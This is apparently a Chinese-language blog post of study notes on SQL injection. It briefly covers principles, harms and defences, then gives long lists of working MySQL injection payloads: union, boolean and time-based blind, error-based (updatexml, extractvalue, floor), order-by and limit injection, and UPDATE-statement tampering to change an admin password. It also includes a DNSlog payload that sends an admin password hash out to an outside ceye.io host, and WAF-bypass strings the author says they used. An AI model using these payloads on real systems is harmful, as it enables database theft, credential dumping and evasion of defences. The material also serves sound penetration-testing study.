---
title: SQL注入
date: 2025-02-07 09:52:58
updated: 2026-03-06 09:53:14
tags:
  - Web
---
<details open>
<summary>可见字符字典</summary>

```plain
%20
$
(
)
,
-
.
/
0
1
2
3
4
5
6
7
8
9
:
;
<
=
?
@
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
[
]
^
`
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
{
|
}
~
```

</details>

# 原理

Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。  
可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。

  

# 分类

1.  布尔型盲注：根据返回页面判断条件真假

2.  时间型盲注：用页面返回时间是否增加判断是否存在注入

3.  基于错误的注入：页面会返回错误信息

4.  联合查询注入：可以使用union的情况下

5.  堆查询注入：可以同时执行多条语句

  

# 危害

```plain
数据库信息泄漏：泄漏用户存储在数据库中的私人信息。作为数据存储中心，各种类型的私人信息通常存储在数据库中。Sql注入攻击能导致这些隐私信息透明于攻击者。

篡改网页：通过操作数据库来篡改特定网页。

网站被挂马、传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。

数据库被恶意操作：数据库服务器受到攻击，数据库系统管理员帐户被篡改。服务器受远程控制，并安装了后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。破坏硬盘数据并使整个系统瘫痪。
```

# 防御方法

1.  使用参数化查询

2.  数据库服务器不会把参数的内容当作SQL指令的一部分来拼接执行而是在数据库完成SQL指令的编译后才套用参数运行(预编译)

```plain
预编译将一次查询通过两次交互完成， 第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行
```

3.  对输入的特殊字符进行转义处理

4.  使用白名单来规范化输入验证方法

5.  安装waf

# 查找SQL注入漏洞，手工测试

## 常规联合查询注入

以**MySQL**注入为例

1、在参数后添加引号尝试报错，并用and 1=1#和and 1=2#测试报错

```plain
?id=1' and 1=1#		页面返回正常
?id=1' and 1=2#		页面返回不正常
?id=-1' or 1=1#		页面返回正常
?id=-1' or 1=2#		页面返回不正常
?id=1' and 1=1 or 'a' ='b		页面返回正常
?id=1' and 1=2 or 'a' ='b		页面返回错误
?id=-1' or 1=1 or 'a' ='b		页面返回正常
?id=-1' or 1=2 or 'a' ='b		页面返回错误

```

2、利用order by猜测字段

```plain
?id=1' order by 3--+		返回正常
?id=1' order by 3--+		返回正常
?id=1' order by 4--+		返回正常
?id=1' order by 5--+		返回错误
--这就证明字段总数为4
```

3、利用union联合查询

```plain
?id=-1%27 union select 1,2,3,4#		--看哪个字段可以显示信息，利用它获取数据库信息
--修改id为一个不存在的id，强行报错
--因为代码默认只返回第一条结果，不会返回 union select 的结果
```

4、获取数据库信息

```plain
id=-1%27 union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#

user()、current_user		--获取数据库用户名
database()	--获取数据库名
version()	--获取数据库版本信息
concat_ws(separator,str1,str2,...)	--含有分隔符地连接字符串 
--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出

--其它信息
@@datadir				--数据库路径
@@version_compile_os	--操作系统版本
```

5、查询数据库的表

```plain

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

id=-1%27 union select 1,2,3,table_name from information_schema.tables where table_schema='sqli' limit 0,1#

--table_schema=数据库名16进制或者用单引号括起来
--改变limit 0,1中前一个参数，得到所有表
```

6、查询数据库字段

```plain
id=-1%27 union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#

#只需指定表名即可
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
#或者指定当前数据库名
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+

爆字段数据
select 字段 from 表 limit 0,1

group_concat(concat_ws(':',username,password)) FROM security.users
#只需指定表名和字段名
?id=-1' union select 1,2,group_concat('id',':',`username`,':',`password`) from users --+
#字段值不加反引号也可以
?id=-1' union select 1,2,group_concat(id,':',username,':',password) from users --+
指定分割符
group_concat(id+SEPARATOR+'\n')
```

7、脱裤，获取数据

```plain
union select 1,2,3,group_concat(name,password)%20from%20sc#
--用字段名从表中取数据
group_concat(str1,str2,...)	--连接一个组的所有字符串
```

## Boolean注入

布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入。  
1、在参数后添加引号尝试报错，并用and 1=1#和and 1=2#测试报错

```plain
?id=1' and 1=1#		页面返回正常
?id=1' and 1=2#		页面返回不正常
```

2、判断数据库名的长度

```plain
1'and length(database())>=1--+		页面返回正常
1'and length(database())>=13--+		页面返回正常
1'and length(database())>=14--+		页面返回错误

由此判断得到数据库名的长度是13个字符
```

3、猜解数据库名  
使用逐字符判断的方式获取数据库名；  
数据库名的范围一般在az、09之内，可能还会有特殊字符 "\_"、"-" 等，这里的字母不区分大小写

```plain
' and substr(database(),1,1)='a'--+
' and substr(database(),2,1)='a'--+

substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。
```

还可以用ASCII码查询

```plain
' and ord(substr(database(),1,1))=97--+
```

4、判断数据库表名

```plain
' and substr((select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个表的名
--修改limit的0,1前边的0~20，逐个猜解每个表
```

5、判断数据库字段名

```plain
' and substr((select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),1,1)='a'--+

--修改1,1前边的1~20，逐字符猜解出第一个字段的名
--修改limit的0,1前边的0~20，逐个猜解每个字段
```

6、取数据

```plain
' and substr((select 字段名 from 表名 limit 0,1),1,1)='a'--+
```

## 报错注入

在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。  
常用的MySQL报错函数

```plain
--xpath语法错误
extractvalue()	--查询节点内容
updatexml()		--修改查询到的内容
它们的第二个参数都要求是符合xpath语法的字符串
如果不满足要求则会报错，并且将查询结果放在报错信息里

--主键重复（duplicate entry）
floor()			--返回小于等于该值的最大整数
只要是count，rand()，group by 三个连用就会造成这种主键重复报错
```

1、尝试用单引号报错  
2、获取数据库名

```plain
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
--0x7e是"~"符号的16进制，在这作为分隔符
```

3、获取表名

```plain
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 0,1),0x7e),1)--+
```

4、获取字段名

```plain
' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1),0x7e),1)--+
```

5、取数据

```plain
' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+
```

其它函数payload语法：

```plain
--extractvalue
' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+

--floor()
' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

## 时间型盲注

盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。  
可以用benchmark，sleep等造成延时效果的函数。  
如果benkchmark和sleep关键字被过滤了，可以让两个非常大的数据表做笛卡尔积 (opens new window)产生大量的计算从而产生时间延迟；  
或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。  
1、利用sleep判断数据库名长度

```plain
' and sleep(5) and 1=1--+	页面返回不正常，延时5秒
' and sleep(5) and 1=2--+	页面返回不正常，不延时

and if(length(database())>1,sleep(5),1)
--if(条件表达式，真，假) --C语言的三目运算符类似
```

2、获取数据库名

```plain
and if(substr(database(),1,1)='a',sleep(5),1)--+
```

具体数据以此类推  
时间型盲注的加速方式 #  
1、Windows平台上的Mysql可以用DNSlog加速注入  
2、利用二分查找法  
sqlmap盲注默认采用的是二分查找法

```plain
利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间
以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数
如果大于，就往中间数~122这块查找。反之亦然~
```

## DNSlog盲注详解

DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；  
DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP的转换访问日志；  
MySQL Load\_File()函数可以发起请求，使用Dnslog接收请求，获取数据；  
通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据

```plain
union select 1,2,load_file(CONCAT('\\',(SELECT hex(pass) FROM user WHERE name='admin' LIMIT 1),'.mysql.wintrysec.ceye.io\abc'))
--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入

注意：load_file()只能在windows平台上才能发起请求，linux下做dnslog攻击是不行的
因为UNC通用命名规范， \\server\share_name
上边 CONCAT 应该写四个反斜杠 \，因为最后会被转义成两个
因为Linux没有遵守UNC，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的

MySQL数据库配置中要设置secure_file_priv为空,才能完整的去请求DNS
secure-file-priv参数是用来限制 LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的
ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
```

在时间型盲注中用DNSlog加速注入

```plain
'and if((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT hex(database())),'.xxx.ceye.io\\abc'))),sleep(5),1)%23
```

## 宽字节注入(过滤了单引号)

```plain
在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；
MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii>128才能达到汉字范围)；
在PHP中使用addslashes函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\”，变成%5c%27;
可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字;
%5c被吃掉了，单引号由此逃逸可以用来闭合语句。
```

使用PHP函数iconv('utf-8','gbk',$\_GET['id']),也可能导致注入产生  
修复建议：

```plain
（1）使用mysqli_set_charset(GBK)指定字符集
（2）使用mysqli_real_escape_string进行转义
```

## 二阶注入

当数据首次插入到数据库中时，许多应用程序能够安全处理这些数据；addslashes() 等字符转义函数。  
一旦数据存储在数据库中，随后应用程序本身或其它后端进程可能会以危险的方式处理这些数据。  
许多这类应用并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。

## 中转注入

当网站做了token保护或js前端加密的情况下  
对于这些站点当手工发现了注入点，但并不适用于用sqlmap等工具跑，可以做中转注入  
本地起个Server，然后用sqlmap扫这个server，Server接收到payload后加到表单中提交

## Order-By注入

order by无法预编译

order by 注入是SQL注入中很常见的，被过滤的概率小  
可被用户控制的数据在order by 子句后边，即order参数可控

## 利用报错

```plain
select * from users order by if(1=1,1,(select 1 from information_schema.tables)); 
select * from users order by if(1=2,1,(select 1 from information_schema.tables));
select * from users order by (select 1 regexp if(1=1,1,0x00)); //正则表达式
select * from users order by (select 1 regexp if(1=2,1,0x00));  //0x00为空导致报错
select * from users order by (select if((ascii(substr(current,1,1))<0),1,sleep(2)) from (select user() as current) as tb1);  //利用sleep延时注入
```

利用regexp

```plain
http://192.168.239.2:81/?order=(select+1+regexp+if(1=1,1,0x00)) 正常
http://192.168.239.2:81/?order=(select+1+regexp+if(1=2,1,0x00)) 错误
```

利用updatexml

```plain
http://192.168.239.2:81/?order=updatexml(1,if(1=1,1,user()),1)  正确
http://192.168.239.2:81/?order=updatexml(1,if(1=2,1,user()),1)  错误
```

利用extractvalue

```plain
http://192.168.239.2:81/?order=extractvalue(1,if(1=1,1,user())) 正确
http://192.168.239.2:81/?order=extractvalue(1,if(1=2,1,user())) 错误
```

利用时间盲注

```plain
/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间
/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒
```

数据猜解  
以猜解user()即root@localhost为例子，由于只能一位一位猜解；  
可以利用SUBSTR,SUBSTRING,MID,以及left和right可以精准分割出每一位子串；  
然后就是比较操作了可以利用=,like,regexp等；  
这里要注意like是不区分大小写；  
通过以下可以得知user()第一位为r,ascii码的16进制为0x72

```plain
http://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
http://192.168.239.2:81/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误
```

猜解当前数据的表名

```plain
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00))  正确
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误
```

猜解指定表名中的列名

```plain
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误
```

## 利用姿势

```plain
select * from users order by (case when (1=1) then user else id end ); //根据user排序
select * from users order by (case when (1=2) then user else id end ); //根据id排序
select * from users order by ifnull(null,user);
select * from users order by ifnull(null,id);
select * from users order by rand(1=1);
select * from users order by rand(1=2);
substr((select database()),1,2) 可以写成 substr((select database()) from 1 for 2) 可以绕过逗号过滤
```

## limit 注入

```plain
格式：
limit m,n
--m是记录开始的位置，n是取n条数据
limit 0,1
--从第一条开始，取一条数据
```

(适用于5.0.0<mysql<5.6.6的版本)

```plain
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT （注入点）
```

确认有注入点前面有 order by 关键字,没法用union  
在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的

报错注入

```plain
?id=1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1); 
```

时间型盲注

直接使用sleep不行，需要用BENCHMARK代替

```plain
?id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(IF(MID(database(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

## SQL里面只有update怎么利用

这种方式会修改数据，很危险，在授权测试允许的情况下才考虑  
一般在用户修改密码的地方  
先理解这句 SQL

```plain
UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'
```

如果此 SQL 被修改成以下形式，就实现了注入  
1、修改 homepage 值为[http://baidu.com](http://baidu.com)', userlevel='3  
之后 SQL 语句变为

```plain
UPDATE user SET password='mypass', homepage='http://baidu.com', userlevel='3' WHERE id='$id'
```

userlevel 为用户级别  
2、修改 password 值为mypass)' WHERE username='admin'#  
之后 SQL 语句变为

```plain
UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'
```

3、修改 id 值为' OR username='admin' 之后 SQL 语句变为

```plain
PDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'
```

  

# 技巧

## 判断数据库

根据注释也可以初步判断数据库类型，但是注释一般可以被程序过滤，所以一般来说，不在考虑范围之内

  

### 端口

```plain
Oracle port：1521
SQL Server port：1433
MySQL port：3306
```

  

### 特定函数

```plain
Mysql
@@version或是version()来返回当前的版本信息
Mysql支持 version()和@@version，而 PostgreSQL 只支持 version(), SQL Server 只支持 @@version

可以使用user()、current_user() 无user函数

Orcale
有特殊dual表
length():表示字符串长度 lengthb():表示字符串的字节长度
只可调用substr()
没有sleep
有instr

DB2
user

PostgreSQL
+and+1::int=1- 返回正常
position函数  mysql也有 无instr函数

SQLServer
'WAITFOR+DELAY+'0:0:5'--+
LEN()：获取字符数（忽略尾随空格）
```

  

  

### 数据库特有数据表

```plain
Oracle
and (select count(*) from sys.user_tables)>0 and 1=1

Mysql 版本大于5.0
and (select count(*) from information_schema.TABLES)>0 and 1=1

access数据库
and (select count(*) from msysobjects)>0 and 1=1

Mssql
and (select count(*) from sysobjects)>0 and 1=1

```

  

### 数据库特有连接符

```plain
Mysql数据库
and '1' + '1' = '11'
and CONCAT('1','1')='11'

mssql
'1' + '1' = '11'

Orcale
'1'||'1'='11'
CONCAT('1','1')='11'

```

  

## sql语句执行顺序

```plain
(1)from
(2)on
(3)join
(4)where
(5)group by：group by 子句将数据划分为多个分组；
(6)sum,count,max,min,avg：聚合函数
(7)having：使用 having 子句筛选分组
(8)select：选择需要的列
(9)distinct（去重）：对结果进行去重操作
(9)union:将多个查询结合联合，会重复上面的步骤
(10)order by：对结果进行排序
(11)limit：返回的条数
```

  

  

# 盲注常用函数

## 判断函数

| 函数 | 作用 |
| --- | --- |
| if(a,b,c) | a为true则返回b,a为假则返回c |
| case when | case when 1=1 then 1 else 1 end |
| sleep(n) | 让语句延迟执行一段时间，执行成功后返回 |
| benchmark(count,expr) | 让某一语句执行一定的次数，执行成功后返回,让expr执行count次 |
| decode(1,1,2,3) | 1=1返回2，否则返回3 |
| instr('abcdefgh','de') | 返回4 |
| 'WAITFOR+DELAY+'0:0:5'--+ | SQL Server特有的延时函数，会使数据库暂停执行 5 秒 |
| exp(710-1)、exp(291-1) |  |

## 字符串截取

| 函数 | 语法 | 作用 |
| --- | --- | --- |
| REGEXP_SUBSTR(oracle、maybe:mysql) | REGEXP_SUBSTR(source_string, pattern, position, occurrence, match_parameter) | oracle:<br>REGEXP_SUBSTR(user,'.',4,1),'s',1,0)) |
| length()、len() | length（str） | 返回str的长度信息 |
| left() | left(str,length) | 如果length为正整数，返回str从左边开始一直到length长度的数，例如： left('abcdefgh',3),则指定从左边开始返回三个字符abc 如果lengh为负数或为0，则返回一个空字符串 如果length大于str，则返回整个str |
| right() | right(str,length） | 返回字符串str最右边的length个字符 |
| substr() | substr(str,pos)substr(str,pos,len),substring(str,pos)或 substring(str,pos,len) | 从指定位置开始，截取字符串指定长度的子串,str:要提取子串的字符串,pos:提取子串的开始位置,len:指定要提取的子串的长度 |
| mid() | MID(column_name[,start,length]) | 同substr |
| slice() |  | 截取 |
| trim() |  | 去除字符串开头和结尾的空格或其他指定字符。 |
| insert() |  | insert(字符串，起始位置，长度，替换为什么) |
| ascii() | ascii(str) | 返回字符串最左边字符的ASCII码值 |
| lpad() | lpad(str1,len,str2) | 如果str1大于len，返回str1左边的len个字符，否则在str1左边填充str2至len |
| rpad() | rpad(str1,len,str2) | 跟lpad同理，不过是在右边填充 |
| instr() | instr (substr,str) | 返回字符串substr中第一次出现str的位置 |
| position() | position('sql' in 'postgresql') 返回8 |  |
| ltrim() 和 rtrim() | ltrim(' aaa ') | 去除字符串左侧或右侧的空格或其他指定字符。 |
| CHARINDEX | 同instr() | sqlserver |

## 字符串连接函数

| concat(str1,str2) | 函数用于连续两个或多个字符串(也可以是列)，形成一个字符串 |
| --- | --- |
| group_concat(str1,str2) | 连接str1，str2，如果有多行结果用逗号分割，SEPARATOR+':'指定分割 |
| concat_ws(sep,str1,str2) | 连接str1,str2并且用sep分割 |

## 编码转换函数

| bin() | 返回值的二进制表示 |
| --- | --- |
| conv(str,m,n) | 将str从m进制转换为n进制 |
| lower() | 转成小写字母 |
| upper() | 转成大写字母 |
| hex() | 十六进制编码 |
| unhex() | 十六进制解码 |
| ascii(chr) | 将字符chr转换为ascii码 |
| ord(str) | 将str转换为ascii码 |
| char(num) | 将ASCII码转换为字符串 |

## 报错函数

### 数据库报错

-   exp() 临界值exp(709)

-   cot(0)

-   pow(99999,999999)

-   power(2,99999)

#### cot

思路参考exp

condition真则报错

```plain
cot(1-(1=1))
```

condition假则报错：

```plain
cot(1=0) # 直接把条件放cot()函数里
```

#### pow

condition真则报错：

```plain
pow(1+(1=1),99999)
```

condition假则报错：

```plain
pow(2-(1=1),99999)
```

  

### floor函数报错原理：

在执行group by name语句时，MySQL会在内部建立一个虚拟表，用来存储列的数据，表中会有一个group的key值作为表的主键，这里的主键就是用来分类的name列中获取，当查询数据时，读取数据库数据，然后查看虚拟表中是否存在，不存在则插入新纪录。  
当group by 在查询虚拟表和插入虚拟表时，如果这两次a语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复，通过自定义提示里报错信息中的主键值来获得敏感信息。  
1.其中如果group by 的对象至少需要2个及以上，否则很难出现报错注入  
2.group by 需要结合count(\*)和rand()函数一起使用  
3.切记不是每一次都成功  
4.其中还可以通过修改rand()函数的随机因子，指定随机数生成方式来提高报错的效率。

  

### 报错型盲注步骤：

```plain
第1步：判断数据库版本（可以同时爆当前数据库和当前用户）
语句：?id=1' union select 1,count(*),concat(version(),"~",floor(rand() *2)) as a from information_schema.tables group by a --+

第2步：爆当前数据库名称
语句：?id=1' union select 1,count(*),concat((select schema_name from information_schema.schemata limit 0,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

第3步：爆某个数据库对应的数据表名称
语句：?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

第4步：爆某个数据包的列名
语句：?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='key' limit 1,1),"~",floor(rand() *2))as x from information_schema.columns group by x --+

第5步：爆某个数据表的对应列的内容
语句：?id=1' union select 1,count(*),concat((select concat(password)from users limit 0,1),"~",floor(fand() *2))as x from information_schema.columns group by x --+

union select 1,count(*),concat((select concat(username,'~',password) from dotaxueyuan.users limit 1,1),'~',floor(rand() *2)) as a from information_schema.tables group by a
```

  

### 基于Xpath函数报错注入：

MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：  
extractvalue、updatexml  
ExtractValue描述：使用XPath表示法从XML字符串中提取值  
UpdateXml描述：改变文档中符合XML片段的值

### extractvalue函数报错注入：

and extractvalue(null,concat(0x7e,(联合语句),0x7e))  
可以理解对我们的后台数据库进行一个xml文档的故意报错  
0x7e的具体含义：0x7e = ~  
利用这种方式，对后台进行一个排序，指定一个参数为null，让它故意报错，将第二个参数中的语句带入数据库执行，最后报错显示执行结果。

extractvalue(XML\_document,XPath\_string)

参数1：XML\_document是String格式，为XML文档对象的名称  
参数2：XPath\_string(Xpath格式的字符串)  
作用：从目标XML中返回所查询值的字符串

### updatexml函数报错注入：

and updatexml(1,concat(0x7e,(联合语句),0x7e),1)  
用来更新xml数据，非法传参让他故意报错，执行我们的sql语句

updatexml(XML\_document,XPath\_string,new\_value)  
参数1：XML\_document是String格式，为文档对象的名称  
参数2：XPath\_string(Xpath格式的字符串)  
参数3：new\_value,String格式，替换找到的符合条件的数据  
作用：改变文档中符合条件的节点的值

```plain
查询到数据库版本
and (updatexml(1,concat(0x7e,(select version()),0x7e),1))
 
查询当前数据库
and (updatexml(1,concat(0x7e,(select database()),0x7e),1))
 
获取当前数据库表名结构
and (updatexml(1,concat(0x7e (select(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e),1))
 
查询该表的字段
and (updatexml(1,concat(0x7e,(select(select group_concat(column_name) from information_schema.columns where table_schema =database() and table_name='users')),0x7e),1))
 
查询字段中的内容
and (updatexml(1,concat(0x7e,(select(select group_concat(concat(role,0x7e,username,0x3A,password,0x7e)) from users)),0x7e),1))
————————————————
```

  

### 步骤

```plain
1.判断闭合情况
2.获取数据库版本
 and extractvalue(1,concat(0x7e,(select version()),0x7e))--+
3.获取表名
and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+
4.获取列名
and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e)) --+
5.获取用户数据
    1)爆用户名：
and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e)) --+
    2)爆密码：
and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e)) --+
```

  

## 其他

### rand()和rand(0)

功能：返回0-1之间的随机数，如果输入随机种子参数0，每次返回的是固定的0-1之间的随机数  
举例1：select \*, rand() from table\_name 每次重新运行都不一样  
举例2：select \*, rand(0) from table\_name 每次重新运行都一样

### count(colomn\_name)

功能：返回匹配指定条件对应的行数； 参数及返回值：返回数据条数  
举例1：select count(column\_name)from table\_name

### greatest (n1, n2, n3…)

返回 n 中的最大值

```plain
select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116
#这里的 greatest(函数，1）是用与比较取出其中最大的值用于爆破
```

### least (n1,n2,n3…)

返回 n 中的最小值，与上同理。

### strcmp (str1,str2):

若所有的字符串均相同，则返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1

eg：

```plain
select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)
```

### in 关键字

```plain
select * from users where id = 1 and substr(user(),1,1) in ('r')
#表示查询user()中id = 1的行的第一个字符是否为 
```

### trim()

利用`TRIM`进行字符串截取比较复杂，在讲解之前我们需要明确一个点：例如`trim(leading 'b' from 'abcd')`会返回`abcd`，因为这句话意思是移除abcd句首的b，但是abcd并不以b为句首开头，所以`trim`函数相当于啥也没干。

为了讲解，这里我用`i`来表示一个字符，例如`i`如果表示`a`，那么`i+1`就表示`b`，`i+2`就表示`c`。注入时，需要进行2次判断，使用4个`trim`函数。第一次判断：

```plain
SELECT TRIM(LEADING i FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
```

我们知道`select database()`结果为`college`，比如现在`i`表示`a`，那么`i+1`就表示`b`，则`trim(leading 'a' from 'college')`和`trim(leading 'b' from 'college')`都返回`college`（因为college不以a也不以b为开头），那么这个`TRIM() = TRIM()`的表达式会返回1。也就是说如果这个第一次判断返回真了，那么表示i和i+1都不是我们想要的正确结果。反之，如果这个`TRIM() = TRIM()`的表达式返回了0，那么`i`和`i+1`其中一个必是正确结果，到底是哪个呢？我们进行二次判断：

```plain
SELECT TRIM(LEADING i+2 FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
```

在第二次判断中，`i+2`和`i+1`做比较。如果第二次判断返回1，则表示`i+2`和`i+1`都不是正确结果，那么就是`i`为正确结果；如果第二次判断返回0，则表示`i+2`和`i+1`其中一个是正确结果，而正确结果已经锁定在`i`和`i+1`了，那么就是`i+1`为正确结果。这是通用的方法，一般写脚本时，因为循环是按顺序来的，所以其实一次判断就能知道结果了，具体大家自己写写脚本体会一下就明白了。

当我们判断出第一位是`'c'`后，只要继续这样判断第二位，然后第三位第四位..以此类推：

```plain
SELECT TRIM(LEADING 'ca' FROM (select database())) = TRIM(LEADING 'cb' FROM (select database()));
SELECT TRIM(LEADING 'cb' FROM (select database())) = TRIM(LEADING 'cc' FROM (select database()));
SELECT TRIM(LEADING 'cc' FROM (select database())) = TRIM(LEADING 'cd' FROM (select database()));
......
```

  

### insert()

```plain
SELECT insert((insert(目标字符串,1,截取的位数,'')),2,9999999,''); # 这里截取的位数从0开始数
```

## 查看数据库信息

### 查看当前数据库版本

-   version()

-   @@version

-   @@global.version

### 查看当前登陆用户

-   user()

-   current\_user()、current\_user全局变量

-   system\_user()

-   session\_user()

### 当前使用的数据库

-   database()

-   schema()

### 路径查询

-   @@basedir ——mysql安装路径

-   @@slave\_load\_tampdir ——临时文件夹路径

-   @@datadir ——数据存储路径

-   @@character\_sets\_dir ——字符集设置文件路径

-   @@log\_error ——错误日志文件路径

-   @@pid\_file ——pid-file文件路径

  

## 姿势技巧

### **AND和减法运算**

`and` 也可以用`&&`来表示，是逻辑与的意思。

在盲注中，可以用一个true去与运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：

![](https://p3.ssl.qhimg.com/t01bce0017a89f02ff6.png)

### **OR和减法运算**

`or` 也可以用`||`来表示，是逻辑或的意思。

在盲注中，可以用一个false去或运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：

![](https://p0.ssl.qhimg.com/t01a92dbf5005a8a87b.png)

  

### **异或注入**

虽然也可以做比较，比如：

![](https://p1.ssl.qhimg.com/t0149a8f65a31074ada.png)

但是异或更多应用在不能使用注释符的情况下。注入时，SQL语句为`SELECT xx FROM yy WHERE zz = '$your_input';`因为用户的输入后面还有一个单引号，很多时候我们使用`#`或者`--`直接注释掉了这个单引号，但是如果注释符被过滤了，那么这个单引号就必须作为SQL语句的一部分，这时可以这样做：

  

```plain
' or '1'^(condition)^'1';
```

### sleep

假设`if`和`case`被ban了，又想要根据condition的真假来决定是否触发`sleep()`，可以将condition整合进`sleep()`中，做乘法即可:

```plain
sleep(5*(condition))
```

如果condition为真则返回1，`5*(condition)`即`5*1`为5，延时5秒；如果condition为假则返回0，`5*(condition)`即`5*0`为0，延时0秒。

  

# sql注入绕waf

## 自己遇到的

```plain
8/(current_user like 0x25)

a'and 1/exp(710-(current_user like 'r%'))='1
a'and exp(709)/exp(710-(current_user like 'r%'))='1

a' or (SELECT 1 FROM (select(sleep(5)))a) or '1'='1

BENCHMARK(10000000,MD5('x'))

'1'='1' and (1=1) or '1' //like '1'
```

![dd.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1759468435547-4eba92ad-6989-4ed0-bebd-547713c12832.png)

```plain
or 1/(CASE WHEN current_user like'%' THEN exp(710) ELSE 1 END)=1
and '1'/(CASE WHEN current_user like'a%' THEN exp(710) ELSE 1 END)='1
and 1/(CASE WHEN current_user like'a%' THEN sleep(4) ELSE 1 END)='1

select * from test where id=1;
select * from test where id=1 and 1=1;
select * from test where id=1 and 1=2;
select * from test where id=1 and 1;
select * from test where id=1 and 0;
select * from test where id=1/1;
select * from test where id=1/0;
